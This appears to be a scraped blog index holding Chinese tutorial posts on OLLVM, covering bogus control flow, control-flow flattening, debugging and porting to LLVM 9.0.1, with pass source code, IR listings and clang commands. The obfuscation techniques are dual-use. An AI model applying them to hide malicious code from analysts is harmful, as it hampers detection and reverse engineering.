basicBlocks.pop_front(); } // end of while(!basicBlocks.empty()) }while(--NumObfTimes \u003e 0); } 接下来我们分析下进行bcf混淆的核心函数addBogusFlow virtual void addBogusFlow(BasicBlock * basicBlock, Function \u0026F) 进行基本块的分割 //获取基本块中的第一个非PHI、非调试信息、非生命周期传递指令 Instruction *i1 = \u0026*basicBlock-\u003ebegin(); if(basicBlock-\u003egetFirstNonPHIOrDbgOrLifetime()) i1 = basicBlock-\u003egetFirstNonPHIOrDbgOrLifetime(); //调用splitBasicBlock,进行基本块的分割 Twine *var; var = new Twine(\"originalBB\"); BasicBlock *originalBB = basicBlock-\u003esplitBasicBlock(i1, *var); 假设要处理的基本块IR指令如下: entry: %retval = alloca i32, align 4 %argc.addr = alloca i32, align 4 %argv.addr = alloca i8**, align 8 %a = alloca i32, align 4 store i32 0, i32* %retval, align 4 store i32 %argc, i32* %argc.addr, align 4 store i8** %argv, i8*** %argv.addr, align 8 %0 = load i8**, i8*** %argv.addr, align 8 %arrayidx = getelementptr inbounds i8*, i8** %0, i64 1 %1 = load i8*, i8** %arrayidx, align 8 %call = call i32 @atoi(i8* %1) #2 store i32 %call, i32* %a, align 4 %2 = load i32, i32* %a, align 4 %cmp = icmp eq i32 %2, 0 br i1 %cmp, label %if.then, label %if.else 经过上述分割后的基本块IR指令如下: entry: br label %originalBB originalBB: %retval = alloca i32, align 4 %argc.addr = alloca i32, align 4 %argv.addr = alloca i8**, align 8 %a = alloca i32, align 4 store i32 0, i32* %retval, align 4 store i32 %argc, i32* %argc.addr, align 4 store i8** %argv, i8*** %argv.addr, align 8 %0 = load i8**, i8*** %argv.addr, align 8 %arrayidx = getelementptr inbounds i8*, i8** %0, i64 1 %1 = load i8*, i8** %arrayidx, align 8 %call = call i32 @atoi(i8* %1) #2 store i32 %call, i32* %a, align 4 %2 = load i32, i32* %a, align 4 %cmp = icmp eq i32 %2, 0 br i1 %cmp, label %if.then, label %if.else 进行基本块的克隆 //仿originalBB进行基本块的克隆 Twine * var3 = new Twine(\"alteredBB\"); BasicBlock *alteredBB = createAlteredBasicBlock(originalBB, *var3, \u0026F); 此时的IR指令如下: entry: br label %originalBB originalBB: %retval = alloca i32, align 4 %argc.addr = alloca i32, align 4 %argv.addr = alloca i8**, align 8 %a = alloca i32, align 4 store i32 0, i32* %retval, align 4 store i32 %argc, i32* %argc.addr, align 4 store i8** %argv, i8*** %argv.addr, align 8 %0 = load i8**, i8*** %argv.addr, align 8 %arrayidx = getelementptr inbounds i8*, i8** %0, i64 1 %1 = load i8*, i8** %arrayidx, align 8 %call = call i32 @atoi(i8* %1) #2 store i32 %call, i32* %a, align 4 %2 = load i32, i32* %a, align 4 %cmp = icmp eq i32 %2, 0 br i1 %cmp, label %if.then, label %if.else originalBBalteredBB: %retvalalteredBB = alloca i32, align 4 %argc.addralteredBB = alloca i32, align 4 %argv.addralteredBB = alloca i8**, align 8 %aalteredBB = alloca i32, align 4 store i32 0, i32* %retvalalteredBB, align 4 store i32 %argc, i32* %argc.addralteredBB, align 4 store i8** %argv, i8*** %argv.addralteredBB, align 8 %4 = load i8**, i8*** %argv.addralteredBB, align 8 %arrayidxalteredBB = getelementptr inbounds i8*, i8** %4, i64 1 %5 = load i8*, i8** %arrayidxalteredBB, align 8 %callalteredBB = call i32 @atoi(i8* %5) #2 store i32 %callalteredBB, i32* %aalteredBB, align 4 %6 = load i32, i32* %aalteredBB, align 4 %cmpalteredBB = icmp eq i32 %6, 0 br i1 %cmpalteredBB, label %if.then, label %if.else 移除基本块的最后一条指令(通常来说是分支或返回指令),即删除其与后继块的关系 alteredBB-\u003egetTerminator()-\u003eeraseFromParent(); basicBlock-\u003egetTerminator()-\u003eeraseFromParent(); 此时的IR指令如下: entry: originalBB: %retval = alloca i32, align 4 %argc.addr = alloca i32, align 4 %argv.addr = alloca i","date":"2023-04-19","objectID":"/posts/llvm/ollvm%E7%A0%94%E7%A9%B6%E4%B9%8Bbcf/:3:2","tags":["LLVM"],"title":"OLLVM研究之BCF","uri":"/posts/llvm/ollvm%E7%A0%94%E7%A9%B6%E4%B9%8Bbcf/"},{"categories":["LLVM"],"content":"替换永真表达式 接下来看下最后一个函数doF,其函数声明如下: bool doF(Module \u0026M) 这个函数主要是找到当前模块中的永真表达式,并将其替换为如下的表达式. (y \u003c 10 || x * (x + 1) % 2 == 0) 可以看到这个表达式也是个永真表达式,只是相对复杂一点. 创建全局变量x和y Twine * varX = new Twine(\"x\"); Twine * varY = new Twine(\"y\"); Value * x1 =ConstantInt::get(Type::getInt32Ty(M.getContext()), 0, false); Value * y1 =ConstantInt::get(Type::getInt32Ty(M.getContext()), 0, false); GlobalVariable * x = new GlobalVariable(M, Type::getInt32Ty(M.getContext()), false, GlobalValue::CommonLinkage, (Constant * )x1, *varX); GlobalVariable * y = new GlobalVariable(M, Type::getInt32Ty(M.getContext()), false, GlobalValue::CommonLinkage, (Constant * )y1, *varY); 找到表达式中的永真表达式 std::vector\u003cInstruction*\u003e toEdit, toDelete; BinaryOperator *op,*op1 = NULL; LoadInst * opX , * opY; ICmpInst * condition, * condition2; // Looking for the conditions and branches to transform for(Module::iterator mi = M.begin(), me = M.end(); mi != me; ++mi){ for(Function::iterator fi = mi-\u003ebegin(), fe = mi-\u003eend(); fi != fe; ++fi){ Instruction * tbb= fi-\u003egetTerminator(); if(tbb-\u003egetOpcode() == Instruction::Br){ BranchInst * br = (BranchInst *)(tbb); if(br-\u003eisConditional()){ FCmpInst * cond = (FCmpInst *)br-\u003egetCondition(); unsigned opcode = cond-\u003egetOpcode(); if(opcode == Instruction::FCmp){ if (cond-\u003egetPredicate() == FCmpInst::FCMP_TRUE){ DEBUG_WITH_TYPE(\"gen\", errs()\u003c\u003c\"bcf: an always true predicate !\\n\"); toDelete.push_back(cond); // The condition toEdit.push_back(tbb); // The branch using the condition } } } } } } 创建永真表达式 for(std::vector\u003cInstruction*\u003e::iterator i =toEdit.begin();i!=toEdit.end();++i){ //if y \u003c 10 || x*(x+1) % 2 == 0 opX = new LoadInst ((Value *)x, \"\", (*i)); opY = new LoadInst ((Value *)y, \"\", (*i)); op = BinaryOperator::Create(Instruction::Sub, (Value *)opX, ConstantInt::get(Type::getInt32Ty(M.getContext()), 1, false), \"\", (*i)); op1 = BinaryOperator::Create(Instruction::Mul, (Value *)opX, op, \"\", (*i)); op = BinaryOperator::Create(Instruction::URem, op1, ConstantInt::get(Type::getInt32Ty(M.getContext()), 2, false), \"\", (*i)); condition = new ICmpInst((*i), ICmpInst::ICMP_EQ, op, ConstantInt::get(Type::getInt32Ty(M.getContext()), 0, false)); condition2 = new ICmpInst((*i), ICmpInst::ICMP_SLT, opY, ConstantInt::get(Type::getInt32Ty(M.getContext()), 10, false)); op1 = BinaryOperator::Create(Instruction::Or, (Value *)condition, (Value *)condition2, \"\", (*i)); BranchInst::Create(((BranchInst*)*i)-\u003egetSuccessor(0), ((BranchInst*)*i)-\u003egetSuccessor(1),(Value *) op1, ((BranchInst*)*i)-\u003egetParent()); (*i)-\u003eeraseFromParent(); // erase the branch } 上述操作就是在指令i前创建如下表达式并构造分支跳转: (y \u003c 10 || x * (x + 1) % 2 == 0) 假设要处理的基本块IR指令如下: entry: %condition = fcmp true float 1.000000e+00, 1.000000e+00 br i1 %condition, label %originalBB, label %originalBBalteredBB 创建永真表达式后的IR指令如下: entry: %condition = fcmp true float 1.000000e+00, 1.000000e+00 %0 = load i32, i32* @x %1 = load i32, i32* @y %2 = sub i32 %0, 1 %3 = mul i32 %0, %2 %4 = urem i32 %3, 2 %5 = icmp eq i32 %4, 0 %6 = icmp slt i32 %1, 10 %7 = or i1 %5, %6 br i1 %7, label %originalBB, label %originalBBalteredBB 删除原永真条件 for(std::vector\u003cInstruction*\u003e::iterator i =toDelete.begin();i!=toDelete.end();++i){ DEBUG_WITH_TYPE(\"gen\", errs() \u003c\u003c \"bcf: Erase condition instruction:\" \u003c\u003c *((Instruction*)*i)\u003c\u003c \"\\n\"); (*i)-\u003eeraseFromParent(); } 假设要处理的基本块IR指令如上,则经过doF函数处理后的IR指令如下: @x = common global i32 0 @y = common global i32 0 entry: %0 = load i32, i32* @x %1 = load i32, i32* @y %2 = sub i32 %0, 1 %3 = mul i32 %0, %2 %4 = urem i32 %3, 2 %5 = icmp eq i32 %4, 0 %6 = icmp slt i32 %1, 10 %7 = or i1 %5, %6 br i1 %7, label %originalBB, label %originalBBalteredBB ","date":"2023-04-19","objectID":"/posts/llvm/ollvm%E7%A0%94%E7%A9%B6%E4%B9%8Bbcf/:3:3","tags":["LLVM"],"title":"OLLVM研究之BCF","uri":"/posts/llvm/ollvm%E7%A0%94%E7%A9%B6%E4%B9%8Bbcf/"},{"categories":["LLVM"],"content":"参考链接 BogusControlFlow.cpp OLLVM混淆研究之BCF篇 OLLVM虚假控制流源码学习笔记 代码混淆技术入门 ","date":"2023-04-19","objectID":"/posts/llvm/ollvm%E7%A0%94%E7%A9%B6%E4%B9%8Bbcf/:4:0","tags":["LLVM"],"title":"OLLVM研究之BCF","uri":"/posts/llvm/ollvm%E7%A0%94%E7%A9%B6%E4%B9%8Bbcf/"},{"categories":["LLVM"],"content":"概述 FLA即控制流平坦化,首先将原程序中switch结构转换成链式的平坦结构,然后创建loopEntry和loopEnd两个基本块来分发调度除第一个基本块外的所有原始基本块. 控制流平坦化前的流程图如下: 控制流平坦化后的流程图如下: 控制流平坦化后,在IDA中的示例如下: 这里我们可以很清楚的看到真实的基本块、loopEntry以及loopEnd的位置. ","date":"2023-04-17","objectID":"/posts/llvm/ollvm%E7%A0%94%E7%A9%B6%E4%B9%8Bfla/:1:0","tags":["LLVM"],"title":"OLLVM研究之FLA","uri":"/posts/llvm/ollvm%E7%A0%94%E7%A9%B6%E4%B9%8Bfla/"},{"categories":["LLVM"],"content":"测试文件 //luoTst.c #include \u003cstdlib.h\u003e #include \u003cstdio.h\u003e int main(int argc, char** argv) { /* 第一个基本块最后一条指令为有条件分支跳转 if(argc \u003e 2){ printf(\"argc \u003e 2\\n\"); } else{ printf(\"argc \u003c= 2\\n\"); } */ switch(argc){ case 0: printf(\"0 hello ollvm\\n\"); case 1: printf(\"1 hello ollvm\\n\"); case 2: printf(\"2 hello ollvm\\n\"); } return 0; } ","date":"2023-04-17","objectID":"/posts/llvm/ollvm%E7%A0%94%E7%A9%B6%E4%B9%8Bfla/:2:0","tags":["LLVM"],"title":"OLLVM研究之FLA","uri":"/posts/llvm/ollvm%E7%A0%94%E7%A9%B6%E4%B9%8Bfla/"},{"categories":["LLVM"],"content":"流程分析 ","date":"2023-04-17","objectID":"/posts/llvm/ollvm%E7%A0%94%E7%A9%B6%E4%B9%8Bfla/:3:0","tags":["LLVM"],"title":"OLLVM研究之FLA","uri":"/posts/llvm/ollvm%E7%A0%94%E7%A9%B6%E4%B9%8Bfla/"},{"categories":["LLVM"],"content":"入口函数 fla的声明在ollvm/include/llvm/Transforms/Obfuscation/Flattening.h //创建对应的Pass Pass *createFlattening(); Pass *createFlattening(bool flag); fla的入口函数是runOnFunction,在ollvm/lib/Transforms/Obfuscation/Flattening.cpp bool Flattening::runOnFunction(Function \u0026F) { Function *tmp = \u0026F; // Do we obfuscate if (toObfuscate(flag, tmp, \"fla\")) { if (flatten(tmp)) { ++Flattened; } } return false; } toObfuscate函数用于判断是否需要进行fla ","date":"2023-04-17","objectID":"/posts/llvm/ollvm%E7%A0%94%E7%A9%B6%E4%B9%8Bfla/:3:1","tags":["LLVM"],"title":"OLLVM研究之FLA","uri":"/posts/llvm/ollvm%E7%A0%94%E7%A9%B6%E4%B9%8Bfla/"},{"categories":["LLVM"],"content":"关键函数 fla的关键函数是flatten,其大概思路就是先将所有的基本块进行保存,找到第一个基本块,在其后面分配一个switchVar变量并赋值,然后添加switch指令,根据switchVar跳向其他基本块,最后更新switchVar,让基本块跳转到正确的后续基本块中. 生成随机key // SCRAMBLER char scrambling_key[16]; llvm::cryptoutils-\u003eget_bytes(scrambling_key, 16); // END OF SCRAMBLER 将源码中的switch结构转成一个链式的分支结构 //Lower switch FunctionPass *lower = createLowerSwitchPass(); lower-\u003erunOnFunction(*f); 转换前后的IR指令对比图如下: 保存函数中需要进行平坦化的块 // Save all original BB for (Function::iterator i = f-\u003ebegin(); i != f-\u003eend(); ++i) { BasicBlock *tmp = \u0026*i; origBB.push_back(tmp); BasicBlock *bb = \u0026*i; //当某一个块的末尾是Invoke指令,即调用其他函数指令 则不进行保护 if (isa\u003cInvokeInst\u003e(bb-\u003egetTerminator())) { return false; } } //原始块太少,也不进行保护 if (origBB.size() \u003c= 1) { return false; } 处理第一个基本块 //在保存的第一个基本块的列表中去除第一个基本块 origBB.erase(origBB.begin()); //将insert指向第一个基本块 Function::iterator tmp = f-\u003ebegin(); //++tmp; BasicBlock *insert = \u0026*tmp; // If main begin with an if BranchInst *br = NULL; //如果第一个基本块的最后一条指令是分支指令,则br指向这条分支指令 if (isa\u003cBranchInst\u003e(insert-\u003egetTerminator())) { br = cast\u003cBranchInst\u003e(insert-\u003egetTerminator()); } //如果br是一个有条件跳转,则会对这个基本块进行分割,将分支跳转指令连同前一条指令一起分割为一个新的基本块,并命名为first if ((br != NULL \u0026\u0026 br-\u003eisConditional()) || insert-\u003egetTerminator()-\u003egetNumSuccessors() \u003e 1) { BasicBlock::iterator i = insert-\u003eend(); --i; if (insert-\u003esize() \u003e 1) { --i; } BasicBlock *tmpBB = insert-\u003esplitBasicBlock(i, \"first\"); origBB.insert(origBB.begin(), tmpBB); } 转换前后的IR指令对比图如下: 在第一个基本块的末尾添加switchVar变量并为其赋值 // Create switch variable and set as it switchVar = new AllocaInst(Type::getInt32Ty(f-\u003egetContext()), 0, \"switchVar\", insert); ConstantInt * first_num = ConstantInt::get(Type::getInt32Ty(f-\u003egetContext()), llvm::cryptoutils-\u003escramble32(0, scrambling_key)); new StoreInst(first_num, switchVar, insert); 这个地方注意下,first_num生成的随机值受两个变量影响,若这两个变量值不变,则下次生成的first_num和之前生成的相同 创建循环开始块和循环结束块 // Create main loop loopEntry = BasicBlock::Create(f-\u003egetContext(), \"loopEntry\", f, insert); loopEnd = BasicBlock::Create(f-\u003egetContext(), \"loopEnd\", f, insert); load = new LoadInst(switchVar, \"switchVar\", loopEntry); // Move first BB on top insert-\u003emoveBefore(loopEntry); BranchInst::Create(loopEntry, insert); // loopEnd jump to loopEntry BranchInst::Create(loopEntry, loopEnd); BasicBlock *swDefault = BasicBlock::Create(f-\u003egetContext(), \"switchDefault\", f, loopEnd); BranchInst::Create(loopEnd, swDefault); // Create switch instruction itself and set condition switchI = SwitchInst::Create(\u0026*f-\u003ebegin(), swDefault, 0, loopEntry); switchI-\u003esetCondition(load); // Remove branch jump from 1st BB and make a jump to the while f-\u003ebegin()-\u003egetTerminator()-\u003eeraseFromParent(); BranchInst::Create(loopEntry, \u0026*f-\u003ebegin()); 此时的IR表示应如下: entry: //... store i32 %0, i32* %.reg2mem %switchVar = alloca i32 store i32 -1217360296, i32* %switchVar br label %loopEntry loopEntry: %switchVar9 = load i32, i32* %switchVar switch i32 %switchVar9, label %switchDefault switchDefault: br label %loopEnd loopEnd: br label %loopEntry 完善loopEntry中的switch结构,为保存的所有原始基本块添加case // Put all BB in the switch for (vector\u003cBasicBlock *\u003e::iterator b = origBB.begin(); b != origBB.end(); ++b) { BasicBlock *i = *b; ConstantInt *numCase = NULL; // Move the BB inside the switch (only visual, no code logic) i-\u003emoveBefore(loopEnd); // Add case to switch numCase = cast\u003cConstantInt\u003e(ConstantInt::get( switchI-\u003egetCondition()-\u003egetType(), llvm::cryptoutils-\u003escramble32(switchI-\u003egetNumCases(), scrambling_key))); switchI-\u003eaddCase(numCase, i); } 重新计算switchVar值,保持原有基本块执行逻辑 // Recalculate switchVar for (vector\u003cBasicBlock *\u003e::iterator b = origBB.begin(); b != origBB.end(); ++b) { BasicBlock *i = *b; ConstantInt *numCase = NULL; //①如果该基本块无后继基本块,则不进行处理 // Ret BB if (i-\u003egetTerminator()-\u003egetNumSuccessors() == 0) { continue; } //②如果该基本块最后一条指令为无条件跳转,即有1个后继基本块,找到后继基本块对应的case,更新switchVar值,然后无条件跳转到loopEnd // If it's a non-conditional jump if (i-\u003egetTerminator()-\u003egetNumSuccessors() == 1) { // Get successor and delete terminator BasicBlock *succ = i-\u003egetTerminator()-\u003egetSuccessor(0); i-\u003egetTerminator()-\u003eeraseFromParent(); // Get next","date":"2023-04-17","objectID":"/posts/llvm/ollvm%E7%A0%94%E7%A9%B6%E4%B9%8Bfla/:3:2","tags":["LLVM"],"title":"OLLVM研究之FLA","uri":"/posts/llvm/ollvm%E7%A0%94%E7%A9%B6%E4%B9%8Bfla/"},{"categories":["LLVM"],"content":"参考链接 Flattening.cpp OLLVM混淆研究之FLA篇 OLLVM源码分析 - Pass之Flattening 基于LLVM Pass实现控制流平坦化 ","date":"2023-04-17","objectID":"/posts/llvm/ollvm%E7%A0%94%E7%A9%B6%E4%B9%8Bfla/:4:0","tags":["LLVM"],"title":"OLLVM研究之FLA","uri":"/posts/llvm/ollvm%E7%A0%94%E7%A9%B6%E4%B9%8Bfla/"},{"categories":["LLVM"],"content":"调试流程 准备一份测试代码. //luoTst.c #include \u003cstdlib.h\u003e #include \u003cstdio.h\u003e //int fun1(int a, int b) __attribute((__annotate__((\"fla\")))); //int fun2(int a, int b) __attribute((__annotate__((\"nofla\")))); //int main(int argc, char** argv) __attribute((__annotate__((\"bcf\")))); int fun1(int a, int b){ if(a + b \u003e 10){ return 10; }else{ return 100; } } int fun2(int a, int b){ if(a - b \u003e 10){ return 5; }else{ return 50; } } int main(int argc, char** argv) { if(argc \u003e 2){ printf(\"hello world\\n\"); }else{ printf(\"hello ollvm\\n\"); } printf(\"fun1:%d\\n\", fun1(argc, 6)); printf(\"fun2:%d\\n\", fun2(argc, 8)); return 0; } 移植ollvm到单独的so. luoOllvm.7z 调试环境准备 ①将llvm编译出的debug二进制文件添加到环境变量中 export PATH=/home/luohun/Desktop/llvm-project-9.0.1/build_debug/bin:$PATH ②用CLion打开上述移植的ollvm so工程,命令行添加如下命令 -Xclang -load -Xclang /home/luohun/Desktop/OLLVM/cmake-build-debug/ollvm/lib/Transforms/Obfuscation/LLVMObfuscation.so -mllvm -fla /home/luohun/Desktop/luo/luoTst.c -emit-llvm -S -o /home/luohun/Desktop/luo/luoTst_fla.ll 构造异常,看下真正的调试命令 上面的调试环境准备后以后,我们会发现仍然无法进行调试,原因是因为平时我们用clang进行编译的时候,它内部会调用clang-9来进行编译.接下来我们来人为构造异常,看下真正的调试命令. 更改调试命令 -cc1 -triple x86_64-unknown-linux-gnu -emit-llvm -disable-free -main-file-name luoTst.c -mrelocation-model static -mthread-model posix -mdisable-fp-elim -fmath-errno -masm-verbose -mconstructor-aliases -munwind-tables -fuse-init-array -target-cpu x86-64 -dwarf-column-info -debugger-tuning=gdb -coverage-notes-file /home/luohun/Desktop/luo/luoTst_fla.gcno -resource-dir /home/luohun/Desktop/llvm-project-9.0.1/build_debug/lib/clang/9.0.1 -internal-isystem /usr/local/include -internal-isystem /home/luohun/Desktop/llvm-project-9.0.1/build_debug/lib/clang/9.0.1/include -internal-externc-isystem /usr/include/x86_64-linux-gnu -internal-externc-isystem /include -internal-externc-isystem /usr/include -fdebug-compilation-dir /home/luohun/Desktop/llvm-project-9.0.1/build_debug/bin -ferror-limit 19 -fmessage-length 0 -fobjc-runtime=gcc -fdiagnostics-show-option -fcolor-diagnostics -load /home/luohun/Desktop/OLLVM/cmake-build-debug/ollvm/lib/Transforms/Obfuscation/LLVMObfuscation.so -mllvm -fla -faddrsig -o /home/luohun/Desktop/luo/luoTst_fla.ll -x c /home/luohun/Desktop/luo/luoTst.c 进行调试 ","date":"2023-04-13","objectID":"/posts/llvm/ollvm%E8%B0%83%E8%AF%95/:1:0","tags":["LLVM"],"title":"OLLVM调试","uri":"/posts/llvm/ollvm%E8%B0%83%E8%AF%95/"},{"categories":["LLVM"],"content":"参考链接 WritingAnLLVMPass ","date":"2023-04-13","objectID":"/posts/llvm/ollvm%E8%B0%83%E8%AF%95/:2:0","tags":["LLVM"],"title":"OLLVM调试","uri":"/posts/llvm/ollvm%E8%B0%83%E8%AF%95/"},{"categories":["LLVM"],"content":"ollvm是一个基于llvm的开源项目,利用llvm会生成IR中间代码并通过pass进行优化的特点,通过增加Pass来对代码进行优化.但这种优化是为了让代码更加复杂,达到混淆的目的.主要有以下3种混淆手段: 指令替换(Substitution) 虚假控制流(Bogus Control Flow) 控制流平坦化(Control Flow Flattening) ","date":"2023-03-21","objectID":"/posts/llvm/ollvm%E7%A7%BB%E6%A4%8D%E5%92%8C%E4%BD%BF%E7%94%A8/:0:0","tags":["LLVM"],"title":"OLLVM移植和使用","uri":"/posts/llvm/ollvm%E7%A7%BB%E6%A4%8D%E5%92%8C%E4%BD%BF%E7%94%A8/"},{"categories":["LLVM"],"content":"高版本移植 ollvm目前官方版本是基于llvm4.0,现在我们将其移植到llvm9.0.1 下载官方的ollvm最新版 git clone -b llvm-4.0 https://github.com/obfuscator-llvm/obfuscator.git 复制原版ollvm,{obfuscator}/include/llvm/Transforms/Obfuscation文件夹到llvm9.0.1同等目录下 将CryptoUtils.h复制到llvm9.0.1的同等目录下 复制原版ollvm,{obfuscator}/lib/llvm/Transforms/Obfuscation文件夹到llvm9.0.1同等目录下. 按照官方提交的commit记录来修改CMakeLists.txt以及LLVMBuild.txt文件. 按照ollvm最新的4.0版本,进行llvm9.0.1的{llvm-project}/llvm/lib/Transforms/IPO/PassManagerBuilder.cpp文件修改 可以看下方官方提交的记录来进行修改,绿色的就是新增的. https://github.com/obfuscator-llvm/obfuscator/commit/adbe45b199d4e42400ee646ad62a781f34b07860#diff-243d2d7bcf5596188ce66141702e60b552ed8af141b9c2b9d0209fb8e9c81fac //PassManagerBuilder.cpp #include \"llvm/Transforms/Obfuscation/BogusControlFlow.h\" #include \"llvm/Transforms/Obfuscation/Flattening.h\" #include \"llvm/Transforms/Obfuscation/Split.h\" #include \"llvm/Transforms/Obfuscation/Substitution.h\" #include \"llvm/CryptoUtils.h\" // Flags for obfuscation static cl::opt\u003cbool\u003e Flattening(\"fla\", cl::init(false), cl::desc(\"Enable the flattening pass\")); static cl::opt\u003cbool\u003e BogusControlFlow(\"bcf\", cl::init(false), cl::desc(\"Enable bogus control flow\")); static cl::opt\u003cbool\u003e Substitution(\"sub\", cl::init(false), cl::desc(\"Enable instruction substitutions\")); static cl::opt\u003cstd::string\u003e AesSeed(\"aesSeed\", cl::init(\"\"), cl::desc(\"seed for the AES-CTR PRNG\")); static cl::opt\u003cbool\u003e Split(\"spli\", cl::init(false), cl::desc(\"Enable basic block splitting\")); PassManagerBuilder::PassManagerBuilder() { //------------------------------------------ // Initialization of the global cryptographically // secure pseudo-random generator if(!AesSeed.empty()) { llvm::cryptoutils-\u003eprng_seed(AesSeed.c_str()); } } void PassManagerBuilder::populateModulePassManager( legacy::PassManagerBase \u0026MPM) { MPM.add(createForceFunctionAttrsLegacyPass()); //-------------- MPM.add(createSplitBasicBlock(Split)); MPM.add(createBogus(BogusControlFlow)); //注意,这个地方跟官方版本不一样,进行了修改 if (Flattening){ MPM.add(createLowerSwitchPass()); } MPM.add(createFlattening(Flattening)); MPM.add(createSubstitution(Substitution)); //-------------- } 按照下方的链接,进行bcf bug修复. https://github.com/obfuscator-llvm/obfuscator/pull/76/files 此时进行编译,会出错,我们继续进行修改. 注释掉下方的2行.然后在PassManagerBuilder.cpp文件中进行修改.(上方已修改过) 还有一处是返回类型的修改,如下: //{llvm-project}/llvm/lib/Transforms/Obfuscation/BogusControlFlow.cpp bool doF(Module \u0026M){ //------ //修改前 TerminatorInst * tbb= fi-\u003egetTerminator(); //修改后 Instruction * tbb= fi-\u003egetTerminator(); //------ } 此时进行编译即可. ninja LLVMObfuscation ninja clang ","date":"2023-03-21","objectID":"/posts/llvm/ollvm%E7%A7%BB%E6%A4%8D%E5%92%8C%E4%BD%BF%E7%94%A8/:1:0","tags":["LLVM"],"title":"OLLVM移植和使用","uri":"/posts/llvm/ollvm%E7%A7%BB%E6%A4%8D%E5%92%8C%E4%BD%BF%E7%94%A8/"},{"categories":["LLVM"],"content":"ollvm使用 下面按照官方给的例子,来进行ollvm特性的学习. https://github.com/obfuscator-llvm/obfuscator/wiki/Features ","date":"2023-03-21","objectID":"/posts/llvm/ollvm%E7%A7%BB%E6%A4%8D%E5%92%8C%E4%BD%BF%E7%94%A8/:2:0","tags":["LLVM"],"title":"OLLVM移植和使用","uri":"/posts/llvm/ollvm%E7%A7%BB%E6%A4%8D%E5%92%8C%E4%BD%BF%E7%94%A8/"},{"categories":["LLVM"],"content":"指令替换(sub) 原理:将一条运算指令,替换为多条等价运算指令. 测试代码如下: //luoTst.c #include \u003cstdio.h\u003e int main(int argc, char** argv) { int n = argc + 2; if(n \u003e= 0){ printf(\"hello ollvm\\r\\n\"); } else{ printf(\"hello World\\r\\n\"); } return 0; } 使用下述命令进行编译,会等价替换1次 clang -mllvm -sub luoTst.c -o luoTst_sub 使用下述命令进行编译,会等价替换3次 clang -mllvm -sub -mllvm -sub_loop=3 luoTst.c -o luoTst_sub3 ","date":"2023-03-21","objectID":"/posts/llvm/ollvm%E7%A7%BB%E6%A4%8D%E5%92%8C%E4%BD%BF%E7%94%A8/:2:1","tags":["LLVM"],"title":"OLLVM移植和使用","uri":"/posts/llvm/ollvm%E7%A7%BB%E6%A4%8D%E5%92%8C%E4%BD%BF%E7%94%A8/"},{"categories":["LLVM"],"content":"虚假控制流(bcf) 原理:克隆一个真实块,并随机替换其中的一些指令,然后用一个永远为真的条件建立一个分支,克隆后的块是不会被执行的. 测试代码如下: //luoTst.c #include \u003cstdlib.h\u003e int main(int argc, char** argv) { int a = atoi(argv[1]); if(a == 0) return 1; else return 10; return 0; } 上述代码转成中间语言表示如下: 经过虚假控制流Pass处理后,流程可能如下: 这里我们使用如下命令使用进行编译,在IDA中看下代码. clang -mllvm -bcf luoTst.c -o luoTst_bcf ","date":"2023-03-21","objectID":"/posts/llvm/ollvm%E7%A7%BB%E6%A4%8D%E5%92%8C%E4%BD%BF%E7%94%A8/:2:2","tags":["LLVM"],"title":"OLLVM移植和使用","uri":"/posts/llvm/ollvm%E7%A7%BB%E6%A4%8D%E5%92%8C%E4%BD%BF%E7%94%A8/"},{"categories":["LLVM"],"content":"控制流平坦化(fla) 原理:先实现一个永真循环,然后在这个循环中放入switch语句,将代码中除了开始块的所有BasicBlock放入这个switch语句的不同case中,通过修改switch的条件,来实现BasicBlock之间的跳转. 测试代码如下: //luoTst.c #include \u003cstdlib.h\u003e int main(int argc, char** argv) { int a = atoi(argv[1]); if(a == 0) return 1; else return 10; return 0; } 上述代码经过控制流平坦化Pass处理后,代码会转成如下所示: #include \u003cstdlib.h\u003e int main(int argc, char** argv) { int a = atoi(argv[1]); int b = 0; while(1) { switch(b) { case 0: if(a == 0) b = 1; else b = 2; break; case 1: return 1; case 2: return 10; default: break; } } return 0; } 未经过处理前的流程如下: 经过处理后的流程如下: 接下来我们使用如下命令进行编译,在IDA中体会下: clang -mllvm -fla luoTst.c -o luoTst_fla 上面的编译选项比较简单,生成的代码,从IDA反汇编结果来看好像还可以,下面使用如下命令进行编译,来体会下控制流平坦化的强大. clang -mllvm -fla -mllvm -split -mllvm -split_num=10 luoTst.c -o luoTst_fla_split10 ","date":"2023-03-21","objectID":"/posts/llvm/ollvm%E7%A7%BB%E6%A4%8D%E5%92%8C%E4%BD%BF%E7%94%A8/:2:3","tags":["LLVM"],"title":"OLLVM移植和使用","uri":"/posts/llvm/ollvm%E7%A7%BB%E6%A4%8D%E5%92%8C%E4%BD%BF%E7%94%A8/"},{"categories":["LLVM"],"content":"函数注解 可以使用注解的方式对指定函数进行指定的混淆方式. 测试代码如下: //luoTst.c #include \u003cstdlib.h\u003e #include \u003cstdio.h\u003e int fun1(int a, int b) __attribute((__annotate__((\"fla\")))); int fun2(int a, int b) __attribute((__annotate__((\"nofla\")))); int main(int argc, char** argv) __attribute((__annotate__((\"bcf\")))); int fun1(int a, int b){ if(a + b \u003e 10){ return 10; }else{ return 100; } } int fun2(int a, int b){ if(a - b \u003e 10){ return 5; }else{ return 50; } } int main(int argc, char** argv) { if(argc \u003e 2){ printf(\"hello world\\n\"); }else{ printf(\"hello ollvm\\n\"); } printf(\"fun1:%d\\n\", fun1(argc, 6)); printf(\"fun2:%d\\n\", fun2(argc, 8)); return 0; } 使用如下命令进行编译即可: clang luoTst.c -o luoTst ","date":"2023-03-21","objectID":"/posts/llvm/ollvm%E7%A7%BB%E6%A4%8D%E5%92%8C%E4%BD%BF%E7%94%A8/:2:4","tags":["LLVM"],"title":"OLLVM移植和使用","uri":"/posts/llvm/ollvm%E7%A7%BB%E6%A4%8D%E5%92%8C%E4%BD%BF%E7%94%A8/"},{"categories":["LLVM"],"content":"参考链接 obfuscator ","date":"2023-03-21","objectID":"/posts/llvm/ollvm%E7%A7%BB%E6%A4%8D%E5%92%8C%E4%BD%BF%E7%94%A8/:3:0","tags":["LLVM"],"title":"OLLVM移植和使用","uri":"/posts/llvm/ollvm%E7%A7%BB%E6%A4%8D%E5%92%8C%E4%BD%BF%E7%94%A8/"},{"categories":["LLVM"],"content":"对于llvm这样的编译框架来说,IR很重要,连接着编译器的前端和后端.实际上我们在llvm中编写的各种pass都是作用在llvm IR上的,因此我们很有必要来了解下llvm IR的结构. llvm IR主要分为以下4个层次: Module:IR化的源文件 Function:编程语言中的函数 BasicBlock:一组顺序执行的指令集合,每个基本块的末尾是跳转或返回指令 Instruction:llvm IR中的最小可执行单位,每一条指令单占一行 